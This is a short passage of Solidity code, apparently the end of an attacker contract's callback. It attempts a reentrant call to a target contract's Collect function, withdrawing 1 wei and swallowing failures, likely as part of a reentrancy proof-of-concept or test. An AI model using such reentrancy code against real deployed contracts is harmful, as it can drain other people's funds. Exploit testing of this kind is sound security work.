            // We call Collect trying to withdraw 1 wei to trigger state change if reentrancy allowed
            // bound not available here; choose a plausible withdraw amount
            uint tryAmt = 1 wei;
            // Attempt a reentrant Collect; ignore failures
            try target.Collect(tryAmt) {
            } catch {
            }
        }
    }
